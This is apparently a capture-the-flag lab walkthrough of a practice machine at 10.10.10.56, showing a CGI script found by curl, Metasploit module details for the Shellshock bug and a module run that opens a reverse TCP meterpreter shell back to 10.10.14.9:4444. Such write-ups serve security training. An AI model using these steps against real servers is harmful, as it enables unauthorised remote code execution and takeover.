- http://10.10.10.56/ - landing page with a single image
- http://10.10.10.56/cgi-bin/user.sh - a script running


```
┌──(kali㉿kali)-[~]
└─$ curl 10.10.10.56/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

```

## Searching for exploits
```

msf auxiliary(scanner/http/apache_mod_cgi_bash_env) > info 0

       Name: Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
     Module: exploit/multi/http/apache_mod_cgi_bash_env_exec
   Platform: 
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2014-09-24

Provided by:
  Stephane Chazelas
  wvu <wvu@metasploit.com>
  juan vazquez <juan.vazquez@metasploit.com>
  lcamtuf

<SNIP>

Description:
  This module exploits the Shellshock vulnerability, a flaw in how the Bash shell
  handles external environment variables. This module targets CGI scripts in the
  Apache web server by setting the HTTP_USER_AGENT environment variable to a
  malicious function definition.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2014-6271
  https://nvd.nist.gov/vuln/detail/CVE-2014-6278
  https://cwe.mitre.org/data/definitions/94.html
  OSVDB (112004)
  https://www.exploit-db.com/exploits/34765
  https://access.redhat.com/articles/1200223
  https://seclists.org/oss-sec/2014/q3/649

Also known as:
  Shellshock


View the full module info with the info -d command.

```

## Meterpreter shell
```
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1062760 bytes) to 10.10.10.56
<SNIP>

meterpreter > 

```